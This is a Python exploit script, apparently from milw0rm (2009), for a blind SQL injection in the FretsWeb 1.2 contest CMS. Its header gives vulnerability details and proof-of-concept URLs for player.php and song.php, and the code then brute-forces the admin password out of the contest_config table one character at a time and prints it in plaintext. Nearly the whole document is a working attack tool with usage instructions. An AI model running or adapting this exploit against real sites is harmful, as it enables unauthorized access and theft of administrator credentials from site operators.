#!/usr/bin/python
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\
#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/
#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []
#**							                                      **
#**    											      **
#**                           VIVA SPAIN!... GANAREMOS EL MUNDIAL!...o.O                      **
#**					   PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#---------------------------------------------------------------------------------------------
#|       	   	     (GET var 'name') BLIND SQL INJECTION EXPLOIT      	             |
#|-------------------------------------------------------------------------------------------|
#|                                    |      FretsWeb 1.2      |		    	     |
#|  CMS INFORMATION:          	      ------------------------	               	             |
#|										             |
#|-->WEB: http://sourceforge.net/projects/fretsweb/			       		     |
#|-->DOWNLOAD: http://sourceforge.net/projects/fretsweb/		                     |
#|-->DEMO: N/A										     |
#|-->CATEGORY: CMS / Games/Entertainment						     |
#|-->DESCRIPTION: Fretsweb is a Contest or Chart Server for Frets on Fire. It...             |
#|		is an improved version of FoFCS.It is meant for...          		     |
#|-->RELEASED: 2009-05-30								     |
#|											     |
#|  CMS VULNERABILITY:									     |
#|											     |
#|-->TESTED ON: firefox 3						                     |
#|-->DORK: N/A									             |
#|-->CATEGORY: BLIND SQLi PYTHON EXPLOIT					             |
#|-->AFFECT VERSION: CURRENT (MAYBE <= ?)				 		     |
#|-->Discovered Bug date: 2009-06-02							     |
#|-->Reported Bug date: 2009-06-02							     |
#|-->Fixed bug date: 2009-06-14								     |
#|-->Info patch: http://sourceforge.net/projects/fretsweb/				     |
#|-->Author: YEnH4ckEr									     |
#|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
#|-->WEB/BLOG: N/A									     |
#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.      |
#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		     |
#---------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#magic quotes=OFF
#
#-------
#NEED:
#-------
#
#Valid name
#
#---------------------------------------
#PROOF OF CONCEPT (SQL INJECTION):
#---------------------------------------
#
#http://[HOST]/[PATH]/player.php?name=[valid_name]'+and+1=1%23 --> TRUE
#http://[HOST]/[PATH]/player.php?name=[valid_name]'+AND+1=0%23 --> FALSE
#
#
#http://[HOST]/[PATH]/song.php?hash=[valid_song]'+and+1=1%23 --> TRUE
#http://[HOST]/[PATH]/song.php?hash=[valid_song]'+and+1=0%23 --> FALSE
#
#--------------
#WATCH VIDEOS
#--------------
#
# BSQLi --> http://www.youtube.com/watch?v=BYrkuAN2ggI
#
# LFI --> http://www.youtube.com/watch?v=LZ8cG_sIHow
#
#
##############################################################################
##############################################################################
##**************************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
##**************************************************************************##
##--------------------------------------------------------------------------##
##**************************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
##**************************************************************************##
##############################################################################
##############################################################################
#
#Used modules
import urllib,sys,re,os
#Defined functions
def init():
	if(sys.platform=='win32'):
		os.system("cls")
		os.system ("title FretsWeb 1.2 Blind SQL Injection Exploit")
		os.system ("color 02")
	else:
		os.sytem("clear")
	print "\t#######################################################\n\n"
	print "\t#######################################################\n\n"
	print "\t##     FretsWeb 1.2 Blind SQL Injection Exploit      ##\n\n"
	print "\t##       ++Conditions: magic_quotes=OFF              ##\n\n"
	print "\t##       ++Needed: Valid name                        ##\n\n"
	print "\t##               Author: Y3nh4ck3r                   ##\n\n"
	print "\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n"
	print "\t##            Proud to be Spanish!                   ##\n\n"
	print "\t#######################################################\n\n"
	print "\t#######################################################\n\n"

def request(urltarget):
	conn=urllib.urlopen(urltarget)
	outcode=conn.read()
	#print outcode #--> Active this line for debugger mode
	return outcode

def error():
	print "\t------------------------------------------------------------\n"
	print "\tWeb isn't vulnerable!\n\n"
	print "\t--->Maybe:\n\n"
	print "\t\t1.-Patched.\n"
	print "\t\t2.-Bad path or host.\n"
	print "\t\t3.-Bad name.\n"
	print "\t\t4.-Magic quotes ON.\n"
	print "\t\tEXPLOIT FAILED!\n"
	print "\t------------------------------------------------------------\n"
	sys.exit()

def testedblindsql():
	print "\t-----------------------------------------------------------------\n"
	print "\tWEB MAYBE BE VULNERABLE!\n\n"
	print "\tTested Blind SQL Injection.\n"
	print "\tStarting exploit...\n"
	print "\t-----------------------------------------------------------------\n\n"

def helper(filename):
	print "\n\t[!!!] FretsWeb 1.2 Blind SQL Injection Exploit\n"
	print "\t[!!!] USAGE MODE: [!!!]\n"
	print "\t[!!!] python "+filename+" [HOST] [PATH] [NAME]\n"
	print "\t[!!!] [HOST]: Web.\n"
	print "\t[!!!] [PATH]: Home Path.\n"
	print "\t[!!!] [NAME]: Name for fish\n"
	print "\t[!!!] Example: python "+filename+" 'www.example.com' 'demo' 'y3nh4ck3r'\n"
	sys.exit()

def brute_length(urlrequest):
	#Username length
	flag=1
	i=0
	while(flag==1):
		i=i+1
		blindsql=urlrequest+"'+AND+(SELECT+length(value)+FROM+contest_config+WHERE+name='admin_password')="+str(i)+"%23" #injected code
		output=request(blindsql)
		if(re.search("<title>Fretsweb - Player</title>",output)):
			flag=2
		else:
			flag=1
		#This is the max length of username
		if (i>50):
			error()
		#Save column length
	length=i
	print "\t<<<<<--------------------------------------------------------->>>>>\n"
	print "\tLength catched!\n"
	print "\tLength Username --> "+str(length)+"\n"
	print "\tWait several minutes...\n"
	print "\t<<<<<--------------------------------------------------------->>>>>\n\n"
	return length

def exploiting (lengthvalue,urlrequest):
	#Bruteforcing values
	values=""
	k=1
	z=32
	while((k<=lengthvalue) and (z<=126)):
		blindsql=urlrequest+"'+AND+ascii(substring((SELECT+value+FROM+contest_config+WHERE+name='admin_password'),"+str(k)+",1))="+str(z)+"%23" #injected code
		output=request(blindsql)
		if(re.search("<title>Fretsweb - Player</title>",output)):
			values=values+chr(z)
			k=k+1
			z=32
#new char
		z=z+1
	return values
#Main
init()
#Init variables
if(len(sys.argv) <= 3):
    helper(sys.argv[0])

host=sys.argv[1]
path=sys.argv[2]
nameforfish=sys.argv[3]
finalrequest="http://"+host+"/"+path+"/player.php?name="+nameforfish
testblind1=finalrequest+"'+AND+1=1%23" #Return true
outcode1=request(testblind1)
testblind2=finalrequest+"'+AND+1=0%23" #Return false
outcode2=request(testblind2)
#Check BSQLi
if(outcode1==outcode2):
	error()
else:
	testedblindsql()
#Catching length of admin password
lengthadmin=brute_length(finalrequest)
#Catching value of password (not hashed)
passwordadmin=exploiting(lengthadmin,finalrequest)
print "\n\t\t*************************************************\n"
print "\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n"
print "\t\t*************************************************\n\n"
print "\t\tAdmin-password: "+passwordadmin+"\n\n"
print "\n\t\t<<----------------------FINISH!-------------------->>\n\n"
print "\t\t<<---------------Thanks to: y3nh4ck3r-------------->>\n\n"
print "\t\t<<------------------------EOF---------------------->>\n\n"
#Check all arguments

# milw0rm.com [2009-06-17]